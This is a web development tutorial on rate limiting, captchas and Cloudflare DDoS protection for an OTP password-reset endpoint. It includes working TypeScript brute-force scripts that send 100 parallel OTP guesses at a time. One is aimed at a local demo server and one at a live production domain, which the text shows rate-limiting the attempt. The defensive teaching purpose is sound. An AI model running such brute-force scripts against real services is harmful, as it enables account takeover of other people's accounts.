# Why rate limitting

1. **Preventing Overload**: Rate limiting controls how often a user or system can make requests to a service. This helps prevent overuse of resources, ensuring that the system remains available and responsive for all users. For example, rate limiting can stop a single user from making thousands of login attempts in a minute, which could otherwise degrade service for others.

1) **Mitigating Abuse**: Without rate limiting, an application could be more susceptible to abuse such as brute force attacks on passwords or spamming behavior. By limiting how often someone can perform an action, it reduces the feasibility of such attacks.

1. **Managing Traffic**: In high-traffic scenarios, like ticket sales for a popular event, rate limiting can help manage the load on a server, preventing crashes and ensuring a fairer distribution of service like bandwidth or access to the purchasing system.

1) **DDoS Protection**: A DDoS attack involves overwhelming a site with a flood of traffic from multiple sources, which can make the website unavailable. DDoS protection mechanisms detect unusual traffic flows and can filter out malicious traffic, helping to keep the service operational despite the attack.

# Common place to add rate limits

Ref - <https://thehackernews.com/2016/03/hack-facebook-account.html>

When you allow a user to `reset their password` using an OTP from their email, the following endpoint should be rate limited heavily

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F32608b57-91ff-4651-a3cb-0578fe693aa3%2FScreenshot_2024-04-20_at_4.02.36_PM.png?table=block\&id=840e837f-46fa-4c61-a56a-09cbc848c30e\&cache=v2 "notion image")

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F5af7a0d5-901f-44ce-8b58-2b9855bf3a53%2FScreenshot_2024-04-20_at_4.02.42_PM.png?table=block\&id=65deaa3c-bd74-40c2-9c19-6a6eb85c9f93\&cache=v2 "notion image")

# Implement a simple reset pass endpoint

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fa5ca682c-df02-4c7f-b1ad-ed3cc4966f88%2FScreenshot_2024-04-20_at_4.02.42_PM.png?table=block\&id=09d5e0f7-8796-45ec-8c03-45546ad42c29\&cache=v2 "notion image")

1. Init a typescript project

```TypeScript
npm init -y
npx tsc --init
```

1. Update tsconfig

```TypeScript
"rootDir": "./src",
"outDir": "./dist"
```

1. Add deps

```TypeScript
npm i express @types/express
```

1. Add the code

```TypeScript
import express from 'express';

const app = express();
const PORT = 3000;

app.use(express.json());

// Store OTPs in a simple in-memory object
const otpStore: Record<string, string> = {};

// Endpoint to generate and log OTP
app.post('/generate-otp', (req, res) => {
  const email = req.body.email;
  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }
  const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
  otpStore[email] = otp;

  console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
  res.status(200).json({ message: "OTP generated and logged" });
});

// Endpoint to reset password
app.post('/reset-password', (req, res) => {
  const { email, otp, newPassword } = req.body;
  if (!email || !otp || !newPassword) {
    return res.status(400).json({ message: "Email, OTP, and new password are required" });
  }
  if (otpStore[email] === otp) {
    console.log(`Password for ${email} has been reset to: ${newPassword}`);
    delete otpStore[email]; // Clear the OTP after use
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

#### Hitting it via postman

Try hitting it with various OTPs one by one. Notice the server doesn’t rate limit you

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fd37ac78a-9d35-4540-92ec-3520bccb0efa%2FScreenshot_2024-04-20_at_4.18.56_PM.png?table=block\&id=9d4e4b43-bf48-438e-be80-016d8dee1bce\&cache=v2 "notion image")

# Exploiting the endpoint

Export Node.js code from Postman to hit the endpoint

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fbddad4a6-471a-4f08-8b5a-0bd92b765115%2FScreenshot_2024-04-20_at_4.20.16_PM.png?table=block\&id=73013d9b-8006-4da8-84c6-1e4d47a584b8\&cache=v2 "notion image")

1. Create a new folder (exploit-service)

1) Initialize simple ts project in it

```TypeScript
npm init -y
npx tsc --init
```

1. Install dependencies

```TypeScript
npm install axios
```

1. Add brute force logic to hit the server

```TypeScript
import axios from "axios";

async function sendRequest(otp: number) {
  let data = JSON.stringify({
    "email": "harkirat@gmail.com",
    "otp": otp,
    "newPassword": "123123123"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
      'sec-ch-ua-mobile': '?0',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'Accept': 'text/x-component',
      'Referer': 'http://localhost:3000/admin',
      'Next-Action': 'a221b071140e55563e91a3226c508cb229c121f6',
      'sec-ch-ua-platform': '"macOS"',
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {

  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()
```

💡

We’ve added batching here and we’re sending 100 req at a time

# Exploiting one in production

Try resetting password on [https://harkirat.classx.co.in](https://harkirat.classx.co.in/new-courses/2)

1. Go to the website

1) Put in a random users email

1. Send OTP

1) Try putting a random OTP

   1.

   ![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F6a05aa9e-bccf-461e-a03a-672049c8346c%2FScreenshot_2024-04-20_at_4.52.36_PM.png?table=block\&id=833b43e9-8283-4815-8fab-3e55a4618b7e\&cache=v2 "notion image")
   2\.

#### Exploiting it

* Copy over the request from the network tab as `curl`

- Paste it in Postman

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fc3725ac2-9a32-489b-877e-1a6a64aad083%2FScreenshot_2024-04-20_at_4.53.21_PM.png?table=block\&id=71c4d1cd-1d37-4b73-8125-3da191a5e1ea\&cache=v2 "notion image")

* Send a request via postman

- Export the request

  *

  ![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fda6d3cec-d706-4dc7-82e4-49f2930fa706%2FScreenshot_2024-04-20_at_4.55.07_PM.png?table=block\&id=b02f2453-d025-41d4-a7ef-53e153b512de\&cache=v2 "notion image")

* Update the script to brute force on this endpoint

```TypeScript
import axios from "axios";

async function sendRequest(otp: number) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=' + otp,
    headers: {
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'auth-key': 'appxapi',
      'client-service': 'Appx',
      'device-type': '',
      'origin': 'https://harkirat.classx.co.in',
      'priority': 'u=1, i',
      'referer': 'https://harkirat.classx.co.in/',
      'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'source': 'website',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }
  };

  try {
    await axios.request(config);
  } catch (error) {
    console.error(error);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()
```

You’ll get `rate limitted`

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F7db48ad8-2a57-401b-b9dc-554fd0adb3d0%2FScreenshot_2024-04-20_at_4.56.49_PM.png?table=block\&id=f32a6809-5b13-4c32-a282-edd19ff8909b\&cache=v2 "notion image")

# Saving the endpoint

Ref <https://www.npmjs.com/package/express-rate-limit>

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F18b34839-a1c2-4d3c-b5d7-e53ca9a1bce1%2FScreenshot_2024-04-20_at_4.58.36_PM.png?table=block\&id=2a2dd2c0-93e7-4182-a7ef-0f58f66a4e39\&cache=v2 "notion image")

Update the code

1. Add dependency `npm i express-rate-limit`

1) Update code

```TypeScript
import express from 'express';
import rateLimit from 'express-rate-limit';

const app = express();
const PORT = 3000;

app.use(express.json());

// Rate limiter configuration
const otpLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 minutes
    max: 3, // Limit each IP to 3 OTP requests per windowMs
    message: 'Too many requests, please try again after 5 minutes',
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

const passwordResetLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 password reset requests per windowMs
    message: 'Too many password reset attempts, please try again after 15 minutes',
    standardHeaders: true,
    legacyHeaders: false,
});

// Store OTPs in a simple in-memory object
const otpStore: Record<string, string> = {};

// Endpoint to generate and log OTP with rate limiting
app.post('/generate-otp', otpLimiter, (req, res) => {
    console.log(req.body);
    const email = req.body.email;
    if (!email) {
        return res.status(400).json({ message: "Email is required" });
    }
    const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
    otpStore[email] = otp;

    console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
    res.status(200).json({ message: "OTP generated and logged" });
});

// Endpoint to reset password with rate limiting
app.post('/reset-password', passwordResetLimiter, (req, res) => {
    const { email, otp, newPassword } = req.body;

    if (!email || !otp || !newPassword) {
        return res.status(400).json({ message: "Email, OTP, and new password are required" });
    }
    if (Number(otpStore[email]) === Number(otp)) {
        console.log(`Password for ${email} has been reset to: ${newPassword}`);
        delete otpStore[email]; // Clear the OTP after use
        res.status(200).json({ message: "Password has been reset successfully" });
    } else {
        res.status(401).json({ message: "Invalid OTP" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

```

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Ff96f7d8a-5fbd-41f2-a220-36364108264d%2FScreenshot_2024-04-20_at_5.00.44_PM.png?table=block\&id=9eef2f23-b296-4ecd-a324-2ff6d203ace9\&cache=v2 "notion image")

# Problem?

Your server is still vulnerable to DDoS

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fdcc2e7c3-9467-4397-841b-7e8fa0048861%2FScreenshot_2024-04-20_at_5.02.39_PM.png?table=block\&id=38c86f62-611d-479e-b609-690569e037e8\&cache=v2 "notion image")

Though DDoS is rarely used for password reset, it is usually used to choke a server

Why do attackers to DDoS -&#x20;

1. To charge ransom because the service remains down until DDoS is lifted

1) On sneaker drop events/NFT mints where the faster the request reaches the server the better

#### How can you save your reset password endpoint?

1. You can implement logic that only 3 resets are allowed per email sent out

1) You can implement `captcha` logic

# Captchas

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F7b36e3f0-5e7f-4c7f-8a29-3913911178ba%2Fimage-3.png?table=block\&id=df0ce3bd-0a62-4ab3-bc80-8a8aa4660767\&cache=v2 "notion image")

Captchas are a great-sh solution to making sure the request was sent by a human and not by a machine

There are various freely available captchas, Cloudflare Turnstile is one of them

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fca248aac-6e57-4867-8584-aeb700b0b318%2FScreenshot_2024-04-20_at_5.07.29_PM.png?table=block\&id=16035a06-3046-45ba-93e4-554bfc351c97\&cache=v2 "notion image")

# Adding captchas via cloudflare

* Add a new site to turnstile

- Keep your site key and site secret safe

* Create a react project

- Add <https://github.com/marsidev/react-turnstile>

* Update `App.tsx`

```TypeScript
import { Turnstile } from '@marsidev/react-turnstile'

import './App.css'
import axios from 'axios'
import { useState } from 'react'

function App() {
  const [token, setToken] = useState<string>("")

  return (
    <>
      <input placeholder='OTP'></input>
      <input placeholder='New password'></input>

      <Turnstile onSuccess={(token) => {
        setToken(token)
      }} siteKey='0x4AAAAAAAXtEe2JIeAEUcjX' />

      <button onClick={() => {
        axios.post("http://localhost:3000/reset-password", {
          email: "harkirat@gmail.com",
          otp: "123456",
          token: token,
        })
      }}>Update password</button>
    </>
  )
}

export default App
```

* Update the backend code

```TypeScript
import express from 'express';
import cors from "cors";

const SECRET_KEY = "your_site_secret";

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors());

// Store OTPs in a simple in-memory object
const otpStore: Record<string, string> = {};

// Endpoint to generate and log OTP
app.post('/generate-otp', (req, res) => {
  console.log(req.body)
  const email = req.body.email;
  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }
  const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
  otpStore[email] = otp;

  console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
  res.status(200).json({ message: "OTP generated and logged" });
});

// Endpoint to reset password
app.post('/reset-password', async (req, res) => {
  const { email, otp, newPassword, token } = req.body;
  console.log(token);

  let formData = new FormData();
	formData.append('secret', SECRET_KEY);
	formData.append('response', token);

  const url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
	const result = await fetch(url, {
		body: formData,
		method: 'POST',
	});
  const challengeSucceeded = (await result.json()).success;

  if (!challengeSucceeded) {
    return res.status(403).json({ message: "Invalid reCAPTCHA token" });
  }

  if (!email || !otp || !newPassword) {
    return res.status(400).json({ message: "Email, OTP, and new password are required" });
  }
  if (Number(otpStore[email]) === Number(otp)) {
    console.log(`Password for ${email} has been reset to: ${newPassword}`);
    delete otpStore[email]; // Clear the OTP after use
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

```

# DDoS protection in prod

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fdcf8a1b5-82dd-4fed-a9cb-a3cf85e06ddd%2F653af01c738a73677c8a6ff07fcb902eb5c410f6_2_690x464.png?table=block\&id=983fe850-32db-450d-9ccf-7923236adbec\&cache=v2 "notion image")

1. Move your domain to cloudflare

1) Proxy all records via cloudflare

![1.00](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F0c9694c2-0cbd-4dcf-89d9-ad5bc633953a%2FScreenshot_2024-04-20_at_5.36.06_PM.png?table=block\&id=31e54a72-43cb-4225-9773-953aad8b28d3\&cache=v2 "notion image")

💡 This is usually more than good enough, but if you’d like to dive further, you can add IP based rate limits, override DDoS in the security section of cloudflare AWS/GCP also provide you with the same
